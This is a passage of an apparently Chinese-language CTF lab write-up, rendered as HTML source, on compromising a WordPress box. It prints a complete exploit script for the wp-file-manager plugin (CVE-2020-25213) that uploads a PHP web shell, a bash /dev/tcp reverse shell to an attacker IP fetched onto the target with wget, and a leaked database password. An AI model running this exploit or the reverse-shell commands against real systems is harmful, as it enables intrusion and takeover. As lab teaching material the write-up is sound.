</span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span>                                     </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">18</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">24</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">323</span>B  <span class="operator">-</span> <span class="symbol">/javascript</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>javascript<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/secret</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>secret<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">404</span> <span class="operator">-</span>  <span class="number">225</span>B  <span class="operator">-</span> <span class="operator">/</span>secret<span class="symbol">/</span>                                          </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p>找到两个目录 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/javascript/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Ubuntu) Server at 192.168.240.139 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>javascript这个目录没有权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/secret/    </span><br><span class="line">Neither &lt;b&gt;/etc/wordpress/config-192.168.240.139.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.240.139.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.   </span><br></pre></td></tr></table></figure></div>
<p>所以这个secret目录下面是wordpress服务，但是无法解析<br>继续用dirsearch扫描secret下的目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dirsearch -u <span class="number">192.168</span>.<span class="number">240.139</span><span class="regexp">/secret/</span>                        </span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages<span class="regexp">/dirsearch/</span>dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class="comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist <span class="keyword">size</span>: <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="keyword">File</span>: <span class="regexp">/root/</span>tmp<span class="regexp">/reports/</span>_192.<span class="number">168.240</span>.<span class="number">139</span>/_secret__25-<span class="number">02</span>-<span class="number">01</span>_16-<span class="number">42</span>-<span class="number">21</span>.txt</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//192.168.240.139/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">21</span>] Starting: secret/</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.ht_wsr.txt                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.save                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.sample</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.orig</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.bak1                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_extra                           </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessBAK</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htm                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.html</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_sc</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswds                                </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_orig                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD2</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.httr-oauth                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswd_test                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.php                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">33</span>] <span class="number">200</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>readme.html                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">328</span>B  - <span class="regexp">/secret/</span>wp-admin  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-admin/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">330</span>B  - <span class="regexp">/secret/</span>wp-content  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-content/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">471</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/upgrade/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">331</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-includes/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/akismet.php    </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/admin.php</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/                              </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">488</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/uploads/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">514</span>B  - <span class="regexp">/secret/</span>wp-content/                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/rss-functions.php             </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">39</span>] <span class="number">500</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>wp-admin/setup-config.php </span><br></pre></td></tr></table></figure></div>
<p>找到一些目录<br>wp-content这个目录是一些wordpress的文件 也只有这个目录下面有有用的信息<br><img src="https://pic1.imgdb.cn/item/679de013d0e0a243d4f973a0.png"></p>
<p>找到了一个插件<br><img src="https://pic1.imgdb.cn/item/679ddfe5d0e0a243d4f9739e.png"><br>这里就不知道如何利用插件的漏洞了，看群主ll104567的视频有了后面的进展 先用searchsploit找到利用的py脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit        wp-file-manager   </span></span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE        | php/webapps/<span class="number">51224.</span>py</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit -m 51224</span></span><br><span class="line">  Exploit: WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE</span><br><span class="line">      <span class="built_in">URL</span>: <span class="keyword">https</span>://www.exploit-db.com/exploits/<span class="number">51224</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/<span class="number">51224.</span>py</span><br><span class="line">    Codes: CVE<span class="number">-2020</span><span class="number">-25213</span></span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII <span class="keyword">text</span> executable, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span> (<span class="number">501</span>)</span><br><span class="line">Copied <span class="built_in">to</span>: /root/tmp/<span class="number">51224.</span>py</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>查看这个脚本做了什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># cat 51224.py                             </span></span><br><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE</span></span><br><span class="line"><span class="comment"># Date: [ 22-01-2023 ]</span></span><br><span class="line"><span class="comment"># Exploit Author: [BLY]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [https://wpscan.com/vulnerability/10389]</span></span><br><span class="line"><span class="comment"># Version: [ File Manager plugin 6.0-6.9]</span></span><br><span class="line"><span class="comment"># Tested on: [ Debian ]</span></span><br><span class="line"><span class="comment"># CVE : [ CVE-2020-25213 ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> sys,signal,time,requests</span><br><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="comment">#from pprint import pprint</span></span><br><span class="line"></span><br><span class="line">def handler(sig,frame):</span><br><span class="line">	print (<span class="string">&quot;[!]Saliendo&quot;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT,handler)</span><br><span class="line"></span><br><span class="line">def commandexec(command):</span><br><span class="line"></span><br><span class="line">	<span class="attr">exec_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php&quot;</span></span><br><span class="line">	<span class="attr">params</span> <span class="operator">=</span> &#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:command</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">r</span><span class="operator">=</span>requests.get(exec_url,params<span class="operator">=</span>params)</span><br><span class="line"></span><br><span class="line">	<span class="attr">soup</span> <span class="operator">=</span> BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line">	<span class="attr">text</span> <span class="operator">=</span> soup.get_text()</span><br><span class="line"></span><br><span class="line">	print (text)</span><br><span class="line">def exploit():</span><br><span class="line"></span><br><span class="line">	global url</span><br><span class="line"></span><br><span class="line">	<span class="attr">url</span> <span class="operator">=</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="attr">command</span> <span class="operator">=</span> sys.argv[<span class="number">2</span>]</span><br><span class="line">	<span class="attr">upload_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="attr">headers</span> <span class="operator">=</span> &#123;</span><br><span class="line">			&#x27;<span class="params">content-type&#x27;:</span> <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww&quot;</span>,</span><br><span class="line">			&#x27;<span class="params">Connection&#x27;:</span> <span class="string">&quot;close&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">payload</span> <span class="operator">=</span> <span class="string">&quot;------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>cmd<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>upload<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>target<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>l1_Lw<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>upload[]<span class="char escape_">\&quot;</span>; filename=<span class="char escape_">\&quot;</span>shell.php<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type: application/x-php<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;?php echo <span class="char escape_">\&quot;</span>&lt;pre&gt;<span class="char escape_">\&quot;</span> . shell_exec($_REQUEST[&#x27;cmd&#x27;]) . <span class="char escape_">\&quot;</span>&lt;/pre&gt;<span class="char escape_">\&quot;</span>; ?&gt;<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww--&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="params">try:</span></span><br><span class="line">		<span class="attr">r</span><span class="operator">=</span>requests.post(upload_url,data<span class="operator">=</span>payload,headers<span class="operator">=</span>headers)</span><br><span class="line">		<span class="comment">#pprint(r.json())</span></span><br><span class="line">		commandexec(command)</span><br><span class="line">	<span class="params">except:</span></span><br><span class="line">		print(<span class="string">&quot;[!] Algo ha salido mal...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def help():</span><br><span class="line"></span><br><span class="line">	print (<span class="string">&quot;<span class="char escape_">\n</span>[*] Uso: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;<span class="char escape_">\&quot;</span>url<span class="char escape_">\&quot;</span> <span class="char escape_">\&quot;</span>comando<span class="char escape_">\&quot;</span>&quot;</span>)</span><br><span class="line">	print (<span class="string">&quot;[!] Ejemplo: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;http://wordpress.local/ id&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ <span class="operator">==</span> &#x27;<span class="params">__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) <span class="operator">!=</span> <span class="number">3</span>:</span><br><span class="line">		help()</span><br><span class="line"></span><br><span class="line">	<span class="params">else:</span></span><br><span class="line">		exploit()                                                                                                                     </span><br></pre></td></tr></table></figure></div>
<p>可以直接到web访问路径&#x2F;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php<br>后面?cmd&#x3D; 传入要执行的命令也可以</p>
<p>cmd传入命令 然后执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span>               </span><br><span class="line"></span><br><span class="line">[*] Uso: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> <span class="string">&quot;url&quot;</span> <span class="string">&quot;comando&quot;</span></span><br><span class="line">[!] Ejemplo: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://wordpress.local/ id</span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://<span class="number">192.168</span>.<span class="number">240.139</span>/secret id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
<p>根据使用示例知道了用法 把id改成要执行的命令<br>然后反弹shell  但是这里用nc没有办法反弹回shell<br>用另外一种方式  写一个reverse.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.240.83</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>   </span><br></pre></td></tr></table></figure></div>
<p>启动http服务 让web那边可以接受到本机的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.   server                                                              </span></span><br><span class="line">Serving HTTP <span class="literal">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> (http:<span class="regexp">//0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
<p>在web端输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=wget 192.168.240.83:8000/reverse.sh</span><br><span class="line">?<span class="attribute">cmd</span>=bash reverse.sh</span><br></pre></td></tr></table></figure></div>
<p>拿到shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -<span class="keyword">lp</span> <span class="number">1234</span></span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="keyword">set</span> terminal process group (<span class="number">650</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="keyword">no</span> job control in this <span class="keyword">shell</span></span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ </span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据最开始的提示有信息的php文件，找到这个文件，查看内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span>cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>这里有数据库密码 myfuckingpassword<br>看了wp 在去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中找内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">www-data@vulny:/usr/share/wordpress$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span 